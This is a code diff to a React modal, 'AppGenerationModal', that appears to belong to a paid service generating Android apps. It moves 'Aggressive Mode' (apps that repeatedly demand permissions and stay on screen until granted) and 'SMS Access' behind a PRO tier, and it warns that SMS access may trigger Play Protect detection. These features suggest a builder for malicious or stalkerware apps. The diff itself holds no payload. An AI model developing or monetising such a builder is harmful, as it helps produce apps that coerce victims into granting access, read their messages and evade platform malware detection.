@@ -260,57 +260,61 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
                             </div>
 
-                            {/* Advanced Section - Collapsible, Hidden by Default, LOCKED for Basic */}
-                            <div className={`mt-4 ${isBasicPlan ? 'opacity-60' : ''}`}>
+                            {/* Advanced Section - Collapsible, Hidden by Default */}
+                            <div className="mt-4">
                                 <button
-                                    onClick={() => !isBasicPlan && setShowAdvanced(!showAdvanced)}
-                                    disabled={isBasicPlan}
-                                    className={`flex items-center gap-2 text-sm transition-colors ${isBasicPlan ? 'text-white/30 cursor-not-allowed' : 'text-white/50 hover:text-white/70'}`}
+                                    onClick={() => setShowAdvanced(!showAdvanced)}
+                                    className="flex items-center gap-2 text-sm text-white/50 hover:text-white/70 transition-colors"
                                 >
-                                    <svg className={`w-4 h-4 transition-transform ${showAdvanced && !isBasicPlan ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <svg className={`w-4 h-4 transition-transform ${showAdvanced ? 'rotate-90' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path>
                                     </svg>
                                     Advanced
-                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                 </button>
 
-                                {showAdvanced && !isBasicPlan && (
+                                {showAdvanced && (
                                     <div className="mt-3 space-y-3">
                                         {/* Aggressive Permissions */}
-                                        <div className="bg-yellow-500/10 p-3 rounded-lg border border-yellow-500/30">
+                                        <div className={`bg-yellow-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-yellow-500/30'}`}>
                                             <div className="flex items-center justify-between mb-1">
                                                 <div className="flex items-center gap-2">
                                                     <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                                                     <span className="text-sm font-medium text-yellow-300">Aggressive Mode</span>
+                                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                                 </div>
                                                 <button
-                                                    onClick={() => setAggressivePermissions(!aggressivePermissions)}
-                                                    className={`w-12 h-6 rounded-full transition-colors relative ${aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                                    onClick={() => !isBasicPlan && setAggressivePermissions(!aggressivePermissions)}
+                                                    disabled={isBasicPlan}
+                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
                                                 >
-                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions ? 'left-7' : 'left-1'}`} />
+                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                                 </button>
                                             </div>
-                                            <p className="text-xs text-yellow-200/50 text-left leading-tight">Repeatedly asks for permissions. App stays visible until granted.</p>
+                                            <p className="text-xs text-yellow-200/50 text-left leading-tight">{isBasicPlan ? 'Upgrade to Standard to unlock' : 'Repeatedly asks for permissions. App stays visible until granted.'}</p>
                                         </div>
 
                                         {/* SMS Permission - Hidden under Advanced */}
-                                        <div className="flex items-center justify-between bg-red-500/10 p-3 rounded-lg border border-red-500/30">
+                                        {/* SMS Permission - Hidden under Advanced */}
+                                        <div className={`flex items-center justify-between bg-red-500/10 p-3 rounded-lg border ${isBasicPlan ? 'border-red-500/30 opacity-60' : 'border-red-500/30'}`}>
                                             <div className="flex items-center gap-2">
                                                 <svg className="w-4 h-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                                 <span className="text-sm font-medium text-red-300">SMS Access</span>
                                                 <span className="text-xs text-red-400/70 px-2 py-0.5 bg-red-500/20 rounded-full">Risky</span>
+                                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                             </div>
                                             <button
                                                 onClick={() => {
+                                                    if (isBasicPlan) return;
                                                     if (!enableSmsPermission) {
                                                         setShowPlayProtectWarning(true);
                                                     } else {
                                                         setEnableSmsPermission(false);
                                                     }
                                                 }}
-                                                className={`w-12 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
+                                                disabled={isBasicPlan}
+                                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
                                             >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-7' : 'left-1'}`} />
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                             </button>
                                         </div>
                                         <p className="text-xs text-red-400/70 pl-2">⚠️ Enabling SMS may trigger Play Protect detection.</p>
